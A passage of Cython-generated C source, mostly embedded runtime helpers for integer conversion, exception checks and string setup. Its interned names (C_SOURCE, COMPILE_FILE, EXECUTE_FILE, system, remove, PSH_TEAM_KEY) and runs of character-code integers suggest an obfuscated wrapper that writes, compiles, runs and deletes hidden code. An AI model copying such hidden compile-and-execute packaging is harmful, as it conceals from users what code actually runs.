(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));\\n                        }\\n                    }\\n                    break;\\n            }\\n#endif\\n#if CYTHON_COMPILING_IN_CPYTHON\\n            if (unlikely(Py_SIZE(x) < 0)) {\\n                goto raise_neg_overflow;\\n            }\\n#else\\n            {\\n                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\\n                if (unlikely(result < 0))\\n                    return (int) -1;\\n                if (unlikely(result == 1))\\n               ""     goto raise_neg_overflow;\\n            }\\n#endif\\n            if (sizeof(int) <= sizeof(unsigned long)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))\\n#ifdef HAVE_LONG_LONG\\n            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))\\n#endif\\n            }\\n        } else {\"\"\\n#if CYTHON_USE_PYLONG_INTERNALS\\n            const digit* digits = ((PyLongObject*)x)->ob_digit;\\n            switch (Py_SIZE(x)) {\\n                case  0: return (int) 0;\\n                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))\\n                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])\\n                case -2:\\n                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\\n                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case 2:\\n                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\\n                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                ca""se -3:\\n                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\\n                            return (int) (((int)-1)*\"\"(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case 3:\\n                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\\n                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\n                        }\\n                    }\\n                    break;\\n                case -4:\\n                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\\n                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digi""ts[0])));\\n                        }\\n                    }\\n                    break;\\n                case 4:\\n                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {\\n                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {\\n                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\\n       \"\"                 } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {\\n                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\\n                        }\\n                    }\\n                    break;\\n            }\\n#endif\\n            if (sizeof(int) <= sizeof(long)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))\\n#ifdef HAVE_LONG_LONG\\n            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {\\n                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))\\n#endif\\n            }\\n        }\\n        {\\n#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)\\n            PyErr_SetString(PyExc_RuntimeError,\\n                            \\\"_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers\\\");\\n#else\\n            int val;\\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\\n #if PY_MAJOR_VERSION < 3\\n            if (likely(v) && !PyLong_Check(v)) {\\n                PyObject *tmp = v;\\n                v = PyNumber_Long(tmp);\\n                Py_DECREF(tmp);\\n            }\\n #endif\\n            if (likely(v)) {\\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\\n                unsigned char *bytes = (unsigned char *)&val;\\n                int ret = _PyLong_AsByteArray((PyLongObject *)v,\\n         ""                                     bytes, sizeof(val),\\n                                              is_little, !is_unsigned);\\n                Py_DECREF(v);\\n                if (likely(!ret))\\n                    return val;\\n            }\\n#endif\\n            return (int) -1;\\n        }\\n    } else {\\n        int val;\\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\\n        if (!tmp) return (int) -1;\\n        val = __Pyx_PyInt_As_int(tmp);\\n        Py_DECREF(tmp);\\n        return val;\\n    }\\nraise_overflow:\\n    PyErr_SetString(PyExc_Ov\"\"erflowError,\\n        \\\"value too large to convert to int\\\");\\n    return (int) -1;\\nraise_neg_overflow:\\n    PyErr_SetString(PyExc_OverflowError,\\n        \\\"can't convert negative value to int\\\");\\n    return (int) -1;\\n}\\n\\n/* FastTypeChecks */\\n    #if CYTHON_COMPILING_IN_CPYTHON\\nstatic int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {\\n    while (a) {\\n        a = a->tp_base;\\n        if (a == b)\\n            return 1;\\n    }\\n    return b == &PyBaseObject_Type;\\n}\\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {\\n    PyObject *mro;\\n    if (a == b) return 1;\\n    mro = a->tp_mro;\\n    if (likely(mro)) {\\n        Py_ssize_t i, n;\\n        n = PyTuple_GET_SIZE(mro);\\n        for (i = 0; i < n; i++) {\\n            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)\\n                return 1;\\n        }\\n        return 0;\\n    }\\n    return __Pyx_InBases(a, b);\\n}\\n#if PY_MAJOR_VERSION == 2\\nstatic int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {\\n    PyObject *exception, *value, *tb;\\n    int res;\\n    __Pyx_PyThreadState_declare\\n    __Pyx_PyThreadState_assign\\n    __Pyx_ErrFetch(&exception, &value, &tb);\\n    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;\\n    if (unlikely(res == -1)) {\\n        PyErr_WriteUnraisable(err);\\n        res = 0;\\n    }""\\n    if (!res) {\\n        res = PyObject_IsSubclass(err, exc_type2);\\n        if (unlikely(res == -1)) {\\n            PyErr_WriteUnraisable(err);\\n            res = 0;\\n        }\\n    }\\n    __Pyx_ErrRestore(exception, value, tb);\\n    return res;\\n}\\n#else\\nstatic CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {\\n    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;\\n    if (!res) {\\n        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);\\n    }\\n    return res;\\n}\\n#endif\\nstatic int __Pyx_PyErr_\"\"GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\\n    Py_ssize_t i, n;\\n    assert(PyExceptionClass_Check(exc_type));\\n    n = PyTuple_GET_SIZE(tuple);\\n#if PY_MAJOR_VERSION >= 3\\n    for (i=0; i<n; i++) {\\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\\n    }\\n#endif\\n    for (i=0; i<n; i++) {\\n        PyObject *t = PyTuple_GET_ITEM(tuple, i);\\n        #if PY_MAJOR_VERSION < 3\\n        if (likely(exc_type == t)) return 1;\\n        #endif\\n        if (likely(PyExceptionClass_Check(t))) {\\n            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;\\n        } else {\\n        }\\n    }\\n    return 0;\\n}\\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {\\n    if (likely(err == exc_type)) return 1;\\n    if (likely(PyExceptionClass_Check(err))) {\\n        if (likely(PyExceptionClass_Check(exc_type))) {\\n            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);\\n        } else if (likely(PyTuple_Check(exc_type))) {\\n            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);\\n        } else {\\n        }\\n    }\\n    return PyErr_GivenExceptionMatches(err, exc_type);\\n}\\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc""_type1, PyObject *exc_type2) {\\n    assert(PyExceptionClass_Check(exc_type1));\\n    assert(PyExceptionClass_Check(exc_type2));\\n    if (likely(err == exc_type1 || err == exc_type2)) return 1;\\n    if (likely(PyExceptionClass_Check(err))) {\\n        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);\\n    }\\n    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));\\n}\\n#endif\\n\\n/* CheckBinaryVersion */\\n    static int __Pyx_check_binary_version(void) {\\n    char ctversion[5];\\n    int same=1, i, found_dot;\\n    const char* rt_from_call = Py_GetVersion();\\n    PyOS_snprintf(ctversion, 5, \\\"%d.%d\\\", PY_MAJOR_VERSI\"\"ON, PY_MINOR_VERSION);\\n    found_dot = 0;\\n    for (i = 0; i < 4; i++) {\\n        if (!ctversion[i]) {\\n            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');\\n            break;\\n        }\\n        if (rt_from_call[i] != ctversion[i]) {\\n            same = 0;\\n            break;\\n        }\\n    }\\n    if (!same) {\\n        char rtversion[5] = {'\\\\0'};\\n        char message[200];\\n        for (i=0; i<4; ++i) {\\n            if (rt_from_call[i] == '.') {\\n                if (found_dot) break;\\n                found_dot = 1;\\n            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {\\n                break;\\n            }\\n            rtversion[i] = rt_from_call[i];\\n        }\\n        PyOS_snprintf(message, sizeof(message),\\n                      \\\"compiletime version %s of module '%.100s' \\\"\\n                      \\\"does not match runtime version %s\\\",\\n                      ctversion, __Pyx_MODULE_NAME, rtversion);\\n        return PyErr_WarnEx(NULL, message, 1);\\n    }\\n    return 0;\\n}\\n\\n/* InitStrings */\\n    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {\\n    while (t->p) {\\n        #if PY_MAJOR_VERSION < 3\\n        if (t->is_unicode) {\\n            *t->p = PyUnicode_DecodeUTF8""(t->s, t->n - 1, NULL);\\n        } else if (t->intern) {\\n            *t->p = PyString_InternFromString(t->s);\\n        } else {\\n            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);\\n        }\\n        #else\\n        if (t->is_unicode | t->is_str) {\\n            if (t->intern) {\\n                *t->p = PyUnicode_InternFromString(t->s);\\n            } else if (t->encoding) {\\n                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);\\n            } else {\\n                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);\\n            }\\n        } else {\\n            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);\\n        }\\n        #endif\\n        if (!*t->p)\\n            return -1;\\n        if (PyObject_Hash(*t->p)\"\" == -1)\\n            return -1;\\n        ++t;\\n    }\\n    return 0;\\n}\\n\\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {\\n    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));\\n}\\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {\\n    Py_ssize_t ignore;\\n    return __Pyx_PyObject_AsStringAndSize(o, &ignore);\\n}\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\\n#if !CYTHON_PEP393_ENABLED\\nstatic const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\\n    char* defenc_c;\\n    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);\\n    if (!defenc) return NULL;\\n    defenc_c = PyBytes_AS_STRING(defenc);\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\\n    {\\n        char* end = defenc_c + PyBytes_GET_SIZE(defenc);\\n        char* c;\\n        for (c = defenc_c; c < end; c++) {\\n            if ((unsigned char) (*c) >= 128) {\\n                PyUnicode_AsASCIIString(o);\\n                return NULL;\\n            }\\n        }\\n    }\\n#endif\\n    *length = PyBytes_GET_SIZE(defenc);\\n    return defenc_c;\\n}\\n#else\\nstatic C""YTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\\n    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\\n    if (likely(PyUnicode_IS_ASCII(o))) {\\n        *length = PyUnicode_GET_LENGTH(o);\\n        return PyUnicode_AsUTF8(o);\\n    } else {\\n        PyUnicode_AsASCIIString(o);\\n        return NULL;\\n    }\\n#else\\n    return PyUnicode_AsUTF8AndSize(o, length);\\n#endif\\n}\\n#endif\\n#endif\\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\\n    if (\\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\\n            __Pyx_sys_getdefaultencoding_not_ascii &&\\n#endif\\n         \"\"   PyUnicode_Check(o)) {\\n        return __Pyx_PyUnicode_AsStringAndSize(o, length);\\n    } else\\n#endif\\n#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))\\n    if (PyByteArray_Check(o)) {\\n        *length = PyByteArray_GET_SIZE(o);\\n        return PyByteArray_AS_STRING(o);\\n    } else\\n#endif\\n    {\\n        char* result;\\n        int r = PyBytes_AsStringAndSize(o, &result, length);\\n        if (unlikely(r < 0)) {\\n            return NULL;\\n        } else {\\n            return result;\\n        }\\n    }\\n}\\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {\\n   int is_true = x == Py_True;\\n   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;\\n   else return PyObject_IsTrue(x);\\n}\\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {\\n    int retval;\\n    if (unlikely(!x)) return -1;\\n    retval = __Pyx_PyObject_IsTrue(x);\\n    Py_DECREF(x);\\n    return retval;\\n}\\nstatic PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {\\n#if PY_MAJOR_VERSION >= 3\\n    if (PyLong_Ch""eck(result)) {\\n        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\\n                \\\"__int__ returned non-int (type %.200s).  \\\"\\n                \\\"The ability to return an instance of a strict subclass of int \\\"\\n                \\\"is deprecated, and may be removed in a future version of Python.\\\",\\n                Py_TYPE(result)->tp_name)) {\\n            Py_DECREF(result);\\n            return NULL;\\n        }\\n        return result;\\n    }\\n#endif\\n    PyErr_Format(PyExc_TypeError,\\n                 \\\"__%.4s__ returned non-%.4s (type %.200s)\\\",\\n                 type_name, type_name, Py_TYPE(result)->tp_name);\\n    Py_DECREF(result);\\n    return NULL;\\n}\\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {\\n#if CYTHON_USE_TYPE_SLOTS\\n  PyNumberMethods *m;\\n#endif\\n  const char *name = NULL;\\n  PyObject *res = NULL;\\n#if PY_MAJOR_VERSION < 3\"\"\\n  if (likely(PyInt_Check(x) || PyLong_Check(x)))\\n#else\\n  if (likely(PyLong_Check(x)))\\n#endif\\n    return __Pyx_NewRef(x);\\n#if CYTHON_USE_TYPE_SLOTS\\n  m = Py_TYPE(x)->tp_as_number;\\n  #if PY_MAJOR_VERSION < 3\\n  if (m && m->nb_int) {\\n    name = \\\"int\\\";\\n    res = m->nb_int(x);\\n  }\\n  else if (m && m->nb_long) {\\n    name = \\\"long\\\";\\n    res = m->nb_long(x);\\n  }\\n  #else\\n  if (likely(m && m->nb_int)) {\\n    name = \\\"int\\\";\\n    res = m->nb_int(x);\\n  }\\n  #endif\\n#else\\n  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {\\n    res = PyNumber_Int(x);\\n  }\\n#endif\\n  if (likely(res)) {\\n#if PY_MAJOR_VERSION < 3\\n    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {\\n#else\\n    if (unlikely(!PyLong_CheckExact(res))) {\\n#endif\\n        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);\\n    }\\n  }\\n  else if (!PyErr_Occurred()) {\\n    PyErr_SetString(PyExc_TypeError,\\n                    \\\"an integer is required\\\");\\n  }\\n  return res;\\n}\\nstatic CYTHON_INLINE Py_ssize_t _""_Pyx_PyIndex_AsSsize_t(PyObject* b) {\\n  Py_ssize_t ival;\\n  PyObject *x;\\n#if PY_MAJOR_VERSION < 3\\n  if (likely(PyInt_CheckExact(b))) {\\n    if (sizeof(Py_ssize_t) >= sizeof(long))\\n        return PyInt_AS_LONG(b);\\n    else\\n        return PyInt_AsSsize_t(b);\\n  }\\n#endif\\n  if (likely(PyLong_CheckExact(b))) {\\n    #if CYTHON_USE_PYLONG_INTERNALS\\n    const digit* digits = ((PyLongObject*)b)->ob_digit;\\n    const Py_ssize_t size = Py_SIZE(b);\\n    if (likely(__Pyx_sst_abs(size) <= 1)) {\\n        ival = likely(size) ? digits[0] : 0;\\n        if (size == -1) ival = -ival;\\n        return ival;\\n    } else {\\n      switch (size) {\\n         case 2:\\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\\n             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\n           }\\n           break;\\n         case -2:\\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\\n             return -(Py_ssize_t) (((((size_t)digits[1]\"\") << PyLong_SHIFT) | (size_t)digits[0]));\\n           }\\n           break;\\n         case 3:\\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\\n             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\n           }\\n           break;\\n         case -3:\\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\\n             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\n           }\\n           break;\\n         case 4:\\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\\n             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\n           }\\n           break;\\n         case -4:\\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\\n             return"" -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\\n           }\\n           break;\\n      }\\n    }\\n    #endif\\n    return PyLong_AsSsize_t(b);\\n  }\\n  x = PyNumber_Index(b);\\n  if (!x) return -1;\\n  ival = PyInt_AsSsize_t(x);\\n  Py_DECREF(x);\\n  return ival;\\n}\\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {\\n  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {\\n    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);\\n#if PY_MAJOR_VERSION < 3\\n  } else if (likely(PyInt_CheckExact(o))) {\\n    return PyInt_AS_LONG(o);\\n#endif\\n  } else {\\n    Py_ssize_t ival;\\n    PyObject *x;\\n    x = PyNumber_Index(o);\\n    if (!x) return -1;\\n    ival = PyInt_AsLong(x);\\n    Py_DECREF(x);\\n    return ival;\\n  }\\n}\\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {\\n  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);\\n}\\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {\\n    \"\"return PyInt_FromSize_t(ival);\\n}\\n\\n\\n#endif /* Py_PYTHON_H */\";\n      static PyObject *__pyx_n_s_COMPILE_FILE;\n      static PyObject *__pyx_n_s_C_FILE;\n      static PyObject *__pyx_n_s_C_SOURCE;\n      static PyObject *__pyx_n_s_EXECUTE_FILE;\n      static PyObject *__pyx_n_s_EXPORT_PYTHONHOME;\n      static PyObject *__pyx_n_s_EXPORT_PYTHON_EXECUTABLE;\n      static PyObject *__pyx_n_s_PREFIX;\n      static PyObject *__pyx_n_s_PSH_TEAM_KEY;\n      static PyObject *__pyx_n_s_PYTHON_VERSION;\n      static PyObject *__pyx_n_s_RUN;\n      static PyObject *__pyx_n_s_cline_in_traceback;\n      static PyObject *__pyx_n_s_dirname;\n      static PyObject *__pyx_n_s_enter;\n      static PyObject *__pyx_n_s_executable;\n      static PyObject *__pyx_n_s_exist_ok;\n      static PyObject *__pyx_n_s_exit;\n      static PyObject *__pyx_n_s_exit_2;\n      static PyObject *__pyx_n_s_f;\n      static PyObject *__pyx_kp_""u_ifndef_PY_SSIZE_T_CLEAN_define;\n      static PyObject *__pyx_n_s_import;\n      static PyObject *__pyx_n_s_isfile;\n      static PyObject *__pyx_n_s_main;\n      static PyObject *__pyx_n_s_makedirs;\n      static PyObject *__pyx_n_s_name;\n      static PyObject *__pyx_n_s_open;\n      static PyObject *__pyx_n_s_os;\n      static PyObject *__pyx_n_s_path;\n      static PyObject *__pyx_n_s_prefix;\n      static PyObject *__pyx_n_s_remove;\n      static PyObject *__pyx_n_s_split;\n      static PyObject *__pyx_n_s_sys;\n      static PyObject *__pyx_n_s_system;\n      static PyObject *__pyx_n_s_test;\n      static PyObject *__pyx_n_s_version;\n      static PyObject *__pyx_n_s_write;\nstatic PyObject *__pyx_int_0;\nstatic PyObject *__pyx_int_32;\nstatic PyObject *__pyx_int_38;\nstatic PyObject *__pyx_int_45;\nstatic PyObject *__pyx_int_46;\nstatic PyObject *__pyx_int_47;\nstatic PyObject *__pyx_int_48;\nstatic PyObject *__pyx_int_49;\nstatic PyObject *__pyx_int_50;\nstatic PyObject *__pyx_int_53;\nstatic PyObject *__pyx_int_55;\nstatic PyObject *__pyx_int_56;\nstatic PyObject *__pyx_int_61;\nstatic PyObject *__pyx_int_65;\nstatic PyObject *__pyx_int_66;\nstatic PyObject *__pyx_int_67;\nstatic PyObject *__pyx_int_69;\nstatic PyObject *__pyx_int_72;\nstatic PyObject *__pyx_int_73;\nstatic PyObject *__pyx_int_76;\nstatic PyObject *__pyx_int_77;\nstatic PyObject *__pyx_int_78;\nstatic PyObject *__pyx_int_79;\nstatic PyObject *__pyx_int_80;\nstatic PyObject *__pyx_int_82;\nstatic PyObject *__pyx_int_84;\nstatic PyObject *__pyx_int_85;\nstatic PyObject *__pyx_int_86;\nstatic PyObject *__pyx_int_88;\nstatic PyObject *__pyx_int_89;\nstatic PyObject *__pyx_int_95;\nstatic PyObject *__pyx_int_97;\nstatic PyObject *__pyx_int_98;\nstatic PyObject *__pyx_int_99;\nstatic PyObject *__pyx_int_100;\nstatic PyObject *__pyx_int_101;\nstatic PyObject *__pyx_int_103;\nstatic PyObject *__pyx_int_104;\nstatic PyObject *__pyx_int_105;\nstatic PyObject *__pyx_int_108;\nstatic PyObject *__pyx_i""nt_110;\nstatic PyObject *__pyx_int_111;\nstatic PyObject *__pyx_int_112;\nstatic PyObject *__pyx_int_114;\nstatic PyObject *__pyx_int_116;\nstatic PyObject *__pyx_int_117;\nstatic PyObject *__pyx_int_118;\nstatic PyObject *__pyx_int_119;\nstatic PyObject *__pyx_int_120;\nstatic PyObject *__pyx_int_121;\nstatic PyObject *__pyx_int_128;\nstatic PyObject *__pyx_int_145;\nstatic PyObject *__pyx_int_159;\nstatic PyObject *__pyx_int_168;\nstatic PyObject *__pyx_int_174;\nstatic PyObject *__pyx_int_216;\nstatic PyObject *__pyx_int_240;\nstatic PyObject *__pyx_int_neg_1;\nstatic PyObject *__pyx_tuple_;\nstatic PyObject *__pyx_slice__2;\nstatic PyObject *__pyx_tuple__3;\n/* Late includes */\n\nstatic PyMethodDef __pyx_methods[] = {\n  {0, 0, 0, 0}\n};\n\n#if PY_MAJOR_VERSION >= 3\n#if CYTHON_PEP489_MULTI_PHASE_INIT\nstatic PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/\nstatic int __pyx_pymod_exec_source(PyObject* module); /*proto*/\nstatic PyModuleDef_Slot __pyx_moduledef_slots[] = {\n  {Py_mod_create, (void*)__pyx_pymod_create},\n  {Py_mod_exec, (void*)__pyx_pymod_exec_source},\n  {0, NULL}\n};\n#endif\n\nstatic struct PyModuleDef __pyx_moduledef = {\n    PyModuleDef_HEAD_INIT,\n    \"source\",\n    0, /* m_doc */\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n    0, /* m_size */\n  #else\n    -1, /* m_size */\n  #endif\n    __pyx_methods /* m_methods */,\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n    __pyx_moduledef_slots, /* m_slots */\n  #else\n    NULL, /* m_reload */\n  #endif\n    NULL, /* m_traverse */\n    NULL, /* m_clear */\n    NULL /* m_free */\n};\n#endif\n#ifndef CYTHON_SMALL_CODE\n#if defined(__clang__)\n    #define CYTHON_SMALL_CODE\n#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))\n    #define CYTHON_SMALL_CODE __attribute__((cold))\n#else\n    #define CYTHON_SMALL_CODE\n#endif\n#endif\n\nstatic __Pyx_StringTabEntry __pyx_string_tab[] = {\n  {&__pyx_n_s_COMPILE_FILE, __pyx_k_COMPILE_FILE, sizeof(__pyx_k_CO""MPILE_FILE), 0, 0, 1, 1},\n  {&__pyx_n_s_C_FILE, __pyx_k_C_FILE, sizeof(__pyx_k_C_FILE), 0, 0, 1, 1},\n  {&__pyx_n_s_C_SOURCE, __pyx_k_C_SOURCE, sizeof(__pyx_k_C_SOURCE), 0, 0, 1, 1},\n  {&__pyx_n_s_EXECUTE_FILE, __pyx_k_EXECUTE_FILE, sizeof(__pyx_k_EXECUTE_FILE), 0, 0, 1, 1},\n  {&__pyx_n_s_EXPORT_PYTHONHOME, __pyx_k_EXPORT_PYTHONHOME, sizeof(__pyx_k_EXPORT_PYTHONHOME), 0, 0, 1, 1},\n  {&__pyx_n_s_EXPORT_PYTHON_EXECUTABLE, __pyx_k_EXPORT_PYTHON_EXECUTABLE, sizeof(__pyx_k_EXPORT_PYTHON_EXECUTABLE), 0, 0, 1, 1},\n  {&__pyx_n_s_PREFIX, __pyx_k_PREFIX, sizeof(__pyx_k_PREFIX), 0, 0, 1, 1},\n  {&__pyx_n_s_PSH_TEAM_KEY, __pyx_k_PSH_TEAM_KEY, sizeof(__pyx_k_PSH_TEAM_KEY), 0, 0, 1, 1},\n  {&__pyx_n_s_PYTHON_VERSION, __pyx_k_PYTHON_VERSION, sizeof(__pyx_k_PYTHON_VERSION), 0, 0, 1, 1},\n  {&__pyx_n_s_RUN, __pyx_k_RUN, sizeof(__pyx_k_RUN), 0, 0, 1, 1},\n  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 